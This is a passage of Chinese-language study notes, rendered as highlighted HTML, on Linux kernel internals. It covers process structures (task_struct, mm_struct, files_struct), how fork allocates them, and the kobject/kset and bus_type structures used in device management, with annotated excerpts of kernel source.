operator">*</span>parent<span class="token punctuation">;</span><span class="token comment">//指向其父进程</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>        children<span class="token punctuation">;</span> <span class="token comment">//链表中的所有元素都是它的子进程</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>        sibling<span class="token punctuation">;</span>  <span class="token comment">//用于把当前进程插入到兄弟链表中</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span>      <span class="token operator">*</span>group_leader<span class="token punctuation">;</span><span class="token comment">//指向其所在进程组的领头进程</span>    u64             utime<span class="token punctuation">;</span>   <span class="token comment">//用于记录进程在用户态下所经过的节拍数</span>    u64             stime<span class="token punctuation">;</span>   <span class="token comment">//用于记录进程在内核态下所经过的节拍数</span>    u64             gtime<span class="token punctuation">;</span>   <span class="token comment">//用于记录作为虚拟机进程所经过的节拍数</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>           min_flt<span class="token punctuation">;</span><span class="token comment">//缺页统计 </span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>           maj_flt<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">fs_struct</span>        <span class="token operator">*</span>fs<span class="token punctuation">;</span>    <span class="token comment">//进程相关的文件系统信息</span>    <span class="token keyword">struct</span> <span class="token class-name">files_struct</span>     <span class="token operator">*</span>files<span class="token punctuation">;</span><span class="token comment">//进程打开的所有文件</span>    <span class="token keyword">struct</span> <span class="token class-name">vm_struct</span>        <span class="token operator">*</span>stack_vm_area<span class="token punctuation">;</span><span class="token comment">//内核栈的内存区</span>        <span class="token comment">//省略了进程的权能、性能跟踪、信号、numa、cgroup等内容</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>task_struct 的创建：在新版本中，从 SLAB 中分配 task_struct 结构体以及从伙伴内存系统分配内核栈</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token function">alloc_thread_stack_node</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">,</span> <span class="token keyword">int</span> node<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">alloc_pages_node</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> THREADINFO_GFP<span class="token punctuation">,</span>                         THREAD_SIZE_ORDER<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配两个页面</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tsk<span class="token operator">-&gt;</span>stack <span class="token operator">=</span> <span class="token function">kasan_reset_tag</span><span class="token punctuation">(</span><span class="token function">page_address</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> tsk<span class="token operator">-&gt;</span>stack<span class="token punctuation">;</span><span class="token comment">//让task_struct结构的stack字段指向page的地址</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span><span class="token function">alloc_task_struct_node</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">kmem_cache_alloc_node</span><span class="token punctuation">(</span>task_struct_cachep<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在task_struct_cachep内存对象中分配一个task_struct结构休对象 </span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span><span class="token function">dup_task_struct</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>orig<span class="token punctuation">,</span> <span class="token keyword">int</span> node<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">;</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>stack<span class="token punctuation">;</span>    tsk <span class="token operator">=</span> <span class="token function">alloc_task_struct_node</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配task_struct结构体</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tsk<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    stack <span class="token operator">=</span> <span class="token function">alloc_thread_stack_node</span><span class="token punctuation">(</span>tsk<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配内核栈</span>    tsk<span class="token operator">-&gt;</span>stack <span class="token operator">=</span> stack<span class="token punctuation">;</span>    <span class="token keyword">return</span> tsk<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> __latent_entropy <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span><span class="token function">copy_process</span><span class="token punctuation">(</span>                    <span class="token keyword">struct</span> <span class="token class-name">pid</span> <span class="token operator">*</span>pid<span class="token punctuation">,</span> <span class="token keyword">int</span> trace<span class="token punctuation">,</span> <span class="token keyword">int</span> node<span class="token punctuation">,</span>                    <span class="token keyword">struct</span> <span class="token class-name">kernel_clone_args</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> pidfd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> retval<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token comment">//……</span>    retval <span class="token operator">=</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>    p <span class="token operator">=</span> <span class="token function">dup_task_struct</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配task_struct和内核栈</span>    <span class="token comment">//……</span>    <span class="token keyword">return</span> <span class="token function">ERR_PTR</span><span class="token punctuation">(</span>retval<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>pid_t <span class="token function">kernel_clone</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kernel_clone_args</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>    u64 clone_flags <span class="token operator">=</span> args<span class="token operator">-&gt;</span>flags<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    pid_t nr<span class="token punctuation">;</span>    <span class="token comment">//……</span>    <span class="token comment">//复制进程</span>    p <span class="token operator">=</span> <span class="token function">copy_process</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> trace<span class="token punctuation">,</span> NUMA_NO_NODE<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//……</span>    <span class="token keyword">return</span> nr<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//建立进程接口</span><span class="token function">SYSCALL_DEFINE0</span><span class="token punctuation">(</span>fork<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">kernel_clone_args</span> args <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span>exit_signal <span class="token operator">=</span> SIGCHLD<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">kernel_clone</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="进程地址空间">进程地址空间</h4><ul><li><p>Linux 是支持虚拟内存的操作系统内核，<code>mm_struct</code> 结构是 Linux 用于描述一个进程的地址空间的数据结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token punctuation">{</span>        <span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span>mmap<span class="token punctuation">;</span> <span class="token comment">//虚拟地址区间链表VMAs</span>        <span class="token keyword">struct</span> <span class="token class-name">rb_root</span> mm_rb<span class="token punctuation">;</span>   <span class="token comment">//组织vm_area_struct结构的红黑树的根</span>        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> task_size<span class="token punctuation">;</span>    <span class="token comment">//进程虚拟地址空间大小</span>        pgd_t <span class="token operator">*</span> pgd<span class="token punctuation">;</span>        <span class="token comment">//指向MMU页表</span>        atomic_t mm_users<span class="token punctuation">;</span> <span class="token comment">//多个进程共享这个mm_struct</span>        atomic_t mm_count<span class="token punctuation">;</span> <span class="token comment">//mm_struct结构本身计数 </span>        atomic_long_t pgtables_bytes<span class="token punctuation">;</span><span class="token comment">//页表占用了多个页</span>        <span class="token keyword">int</span> map_count<span class="token punctuation">;</span>      <span class="token comment">//多少个VMA</span>        spinlock_t page_table_lock<span class="token punctuation">;</span> <span class="token comment">//保护页表的自旋锁</span>        <span class="token keyword">struct</span> <span class="token class-name">list_head</span> mmlist<span class="token punctuation">;</span> <span class="token comment">//挂入mm_struct结构的链表</span>        <span class="token comment">//进程应用程序代码开始、结束地址，应用程序数据的开始、结束地址 </span>        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> start_code<span class="token punctuation">,</span> end_code<span class="token punctuation">,</span> start_data<span class="token punctuation">,</span> end_data<span class="token punctuation">;</span>        <span class="token comment">//进程应用程序堆区的开始、当前地址、栈开始地址 </span>        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> start_brk<span class="token punctuation">,</span> brk<span class="token punctuation">,</span> start_stack<span class="token punctuation">;</span>        <span class="token comment">//进程应用程序参数区开始、结束地址</span>        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg_start<span class="token punctuation">,</span> arg_end<span class="token punctuation">,</span> env_start<span class="token punctuation">,</span> env_end<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20221205-mmstruct.png" alt=""></p></blockquote></li><li><p>mm_struct 实例变量的创建</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//在mm_cachep内存对象中分配一个mm_struct结构休对象</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">allocate_mm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">(</span><span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>mm_cachep<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span><span class="token function">dup_mm</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">,</span>                <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>oldmm<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">;</span>    <span class="token comment">//分配mm_struct结构</span>    mm <span class="token operator">=</span> <span class="token function">allocate_mm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mm<span class="token punctuation">)</span>        <span class="token keyword">goto</span> fail_nomem<span class="token punctuation">;</span>    <span class="token comment">//复制mm_struct结构</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>mm<span class="token punctuation">,</span> oldmm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>mm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//……</span>    <span class="token keyword">return</span> mm<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">copy_mm</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> clone_flags<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">,</span> <span class="token operator">*</span>oldmm<span class="token punctuation">;</span>    <span class="token keyword">int</span> retval<span class="token punctuation">;</span>    tsk<span class="token operator">-&gt;</span>min_flt <span class="token operator">=</span> tsk<span class="token operator">-&gt;</span>maj_flt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    tsk<span class="token operator">-&gt;</span>nvcsw <span class="token operator">=</span> tsk<span class="token operator">-&gt;</span>nivcsw <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    retval <span class="token operator">=</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>    mm <span class="token operator">=</span> <span class="token function">dup_mm</span><span class="token punctuation">(</span>tsk<span class="token punctuation">,</span> current<span class="token operator">-&gt;</span>mm<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配mm_struct结构的实例变量</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mm<span class="token punctuation">)</span>        <span class="token keyword">goto</span> fail_nomem<span class="token punctuation">;</span>good_mm<span class="token operator">:</span>    tsk<span class="token operator">-&gt;</span>mm <span class="token operator">=</span> mm<span class="token punctuation">;</span>    tsk<span class="token operator">-&gt;</span>active_mm <span class="token operator">=</span> mm<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>fail_nomem<span class="token operator">:</span>    <span class="token keyword">return</span> retval<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="Linux-进程文件表">Linux 进程文件表</h4><ul><li><p>一个进程对一个文件进行读写操作之前，必须先打开文件，这个打开的文件就记录在进程的文件表中，它由task_struct结构中的files字段指向。这里指向的其实是个<strong>files_struct结构</strong>，代码如下所示。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">files_struct</span> <span class="token punctuation">{</span>     atomic_t count<span class="token punctuation">;</span><span class="token comment">//自动计数</span>    <span class="token keyword">struct</span> <span class="token class-name">fdtable</span> __rcu <span class="token operator">*</span>fdt<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">fdtable</span> fdtab<span class="token punctuation">;</span>    spinlock_t file_lock<span class="token punctuation">;</span> <span class="token comment">//自旋锁</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> next_fd<span class="token punctuation">;</span><span class="token comment">//下一个文件句柄</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> close_on_exec_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//执行exec()时要关闭的文件句柄</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> open_fds_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> full_fds_bits_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">file</span> __rcu <span class="token operator">*</span> fd_array<span class="token punctuation">[</span>NR_OPEN_DEFAULT<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//默认情况下打开文件的指针数组</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="Linux-进程调度">Linux 进程调度</h3><p>进程调度实体</p><p>进程运行队列</p><p>调度实体和运行队列的关系</p><p>调度器类</p><h2 id="07-设备管理与驱动">07 | 设备管理与驱动</h2><h3 id="Linux-设备信息">Linux 设备信息</h3><ul><li>Linux 的设计哲学就是一切皆文件，对设备文件进行操作就等同于操作具体的设备</li><li>Linux 设备文件在 <code>/sys/bus</code> 目录下查看，Linux 用总线组织设备和驱动</li></ul><h4 id="核心数据结构">核心数据结构</h4><h5 id="kobject-kset">kobject/kset</h5><ul><li><p><code>kobject</code> 和 <code>kset</code> 是构成 <code>/sys</code> 目录下（sysfs 文件系统挂载在此目录下）的目录节点和文件节点的核心，也是层次化组织总线、设备、驱动的核心数据结构，它们都能表示一个目录或者文件节点，kset 与 kobject 结构只是基础数据结构</p></li><li><p>kobject：一个 kobject 对应着 /sys 目录下的一个目录或者文件，kobject 挂载在 kset 下并且指向了 kset，而 kset 结构中本身又包含一个 kobject 结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">kobject</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>      <span class="token operator">*</span>name<span class="token punctuation">;</span>           <span class="token comment">//名称，反映在sysfs中</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    entry<span class="token punctuation">;</span>       <span class="token comment">//挂入kset结构的链表</span>    <span class="token keyword">struct</span> <span class="token class-name">kobject</span>      <span class="token operator">*</span>parent<span class="token punctuation">;</span>     <span class="token comment">//指向父结构 </span>    <span class="token keyword">struct</span> <span class="token class-name">kset</span>     <span class="token operator">*</span>kset<span class="token punctuation">;</span>           <span class="token comment">//指向所属的kset</span>    <span class="token keyword">struct</span> <span class="token class-name">kobj_type</span>    <span class="token operator">*</span>ktype<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">kernfs_node</span>  <span class="token operator">*</span>sd<span class="token punctuation">;</span>         <span class="token comment">//指向sysfs文件系统目录项 </span>    <span class="token keyword">struct</span> <span class="token class-name">kref</span>     kref<span class="token punctuation">;</span>            <span class="token comment">//引用计数器结构</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> state_initialized<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//初始化状态</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> state_in_sysfs<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">//是否在sysfs中</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> state_add_uevent_sent<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> state_remove_uevent_sent<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> uevent_suppress<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>kset：既是 kobject 的容器，同时本身还是一个 kobject</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">kset</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> list<span class="token punctuation">;</span> <span class="token comment">//挂载kobject结构的链表</span>    spinlock_t list_lock<span class="token punctuation">;</span> <span class="token comment">//自旋锁</span>    <span class="token keyword">struct</span> <span class="token class-name">kobject</span> kobj<span class="token punctuation">;</span><span class="token comment">//自身包含一个kobject结构</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">kset_uevent_ops</span> <span class="token operator">*</span>uevent_ops<span class="token punctuation">;</span><span class="token punctuation">}</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Linux 内核中至少有两个顶层 kset</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">kset</span> <span class="token operator">*</span>devices_kset<span class="token punctuation">;</span><span class="token comment">//管理所有设备</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">kset</span> <span class="token operator">*</span>bus_kset<span class="token punctuation">;</span><span class="token comment">//管理所有总线</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">kset</span> <span class="token operator">*</span>system_kset<span class="token punctuation">;</span><span class="token keyword">int</span> __init <span class="token function">devices_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    devices_kset <span class="token operator">=</span> <span class="token function">kset_create_and_add</span><span class="token punctuation">(</span><span class="token string">"devices"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>device_uevent_ops<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//建立设备kset</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> __init <span class="token function">buses_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    bus_kset <span class="token operator">=</span> <span class="token function">kset_create_and_add</span><span class="token punctuation">(</span><span class="token string">"bus"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bus_uevent_ops<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//建立总线kset</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bus_kset<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>    system_kset <span class="token operator">=</span> <span class="token function">kset_create_and_add</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>devices_kset<span class="token operator">-&gt;</span>kobj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在设备kset之下建立system的kset</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>system_kset<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>kset 和 kobject 在逻辑上形成的层次结构</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220830-kobject-and-kset.png" alt=""></p></li></ul><h5 id="总线">总线</h5><ul><li><p>总线是 Linux 设备的基础，它可以表示 CPU 与设备的连接</p></li><li><p>Linux 把总线抽象成 <code>bus_type</code> 结构，结构中包括总线名字、总线属性，还有操作该总线下所有设备通用操作函数的指针，可以看出，总线不仅仅是组织设备和驱动的容器，还是<strong>同类设备的共有功能的抽象层</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">bus_type</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>      <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token comment">//总线名称</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>      <span class="token operator">*</span>dev_name<span class="token punctuation">;</span><span class="token comment">//用于列举设备，如（"foo%u", dev-&gt;id）</span>    <span class="token keyword">struct</span> <span class="token class-name">device</span>       <span class="token operator">*</span>dev_root<span class="token punctuation">;</span><span class="token comment">//父设备</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">attribute_group</span> <span class="token operator">*</span><span class="token operator">*</span>bus_groups<span class="token punctuation">;</span><span class="token comment">//总线的默认属性</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">attribute_group</span> <span class="token operator">*</span><span class="token operator">*</span>dev_groups<span class="token punctuation">;</span><span class="token comment">//总线上设备的默认属性</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">attribute_group</span> <span class="token operator">*</span><span class="token operator">*</span>drv_groups<span class="token punctuation">;</span><span class="token comment">//总线上驱动的默认属性</span>    <span class="token comment">//每当有新的设备或驱动程序被添加到这个总线上时调用</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>match<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当一个设备被添加、移除或其他一些事情时被调用产生uevent来添加环境变量。</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>uevent<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">kobj_uevent_env</span> <span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当一个新的设备或驱动程序添加到这个总线时被调用，并回调特定驱动程序探查函数，以初始化匹配的设备</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>probe<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//将设备状态同步到软件状态时调用</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sync_state<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当一个设备从这个总线上删除时被调用</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>remove<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当系统关闭时被调用</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>shutdown<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用以使设备重新上线（在下线后）</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>online<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用以使设备离线，以便热移除。可能会失败。</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>offline<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当这个总线上的设备想进入睡眠模式时调用</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>suspend<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token 